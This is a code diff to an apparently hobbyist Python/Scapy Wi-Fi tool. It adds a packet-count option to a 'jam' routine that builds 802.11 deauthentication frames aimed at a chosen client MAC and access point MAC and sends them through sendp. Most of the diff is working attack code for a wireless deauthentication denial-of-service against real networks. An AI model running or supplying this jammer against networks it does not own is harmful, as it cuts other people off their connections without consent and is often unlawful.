@@ -74,6 +74,13 @@ def argumentGenerator():
                             + " needed for -j. Example: -a"\
                             + " 62:61:6c:6c:7a:7a")
 
+    # Number of deauth - optional
+    parser.add_argument("-c",
+                        "--count",
+                        type = int,
+                        help = "number of deauth packets to send."\
+                            + " Example: -c 100")
+
     # Other options?
 
     # Returns all the arguments
@@ -97,6 +104,9 @@ def argumentTreat(args):
     # Make sure it also has the additional target mac and ap mac
     if (args.jam):
         if (args.target and args.accesspoint):
+            numPackets = 10
+            if (args.count):
+                numPackets = args.count
             target = args.target
             accesspoint = args.accesspoint
         else:
@@ -105,7 +115,7 @@ def argumentTreat(args):
             exit(0)
 
         # Error checking done - let's freakin' jam shit
-        jam(iface, target, accesspoint)
+        jam(iface, target, accesspoint, numPackets)
 
     else:
         # Just sniff shit
@@ -121,11 +131,10 @@ def printVerboseDetails():
 
 
 # The jammer part
-# Takes in the interface, targetMac and apMac
-def jam(interface, targetMac, apMac):
-    conf.iface = interface
+# iface, targetMac and apMac, and counter (numPackets) of deauth
+def jam(iface, targetMac, apMac, numPackets):
+    card = iface
     packets = [] # Empty array to store packets in
-
 
     deAuth1 = RadioTap()/Dot11(type = 0, subtype = 12,
         addr1 = targetMac.lower(),
@@ -142,7 +151,7 @@ def jam(interface, targetMac, apMac):
 
     for packet in packets:
         # use sendp to send packets over correct interface
-        sendp(packet, inter = 0.2, count = 1000)
+        sendp(packet, iface = card, inter = 0.2, count = numPackets)
 
 
 # The sniffer part
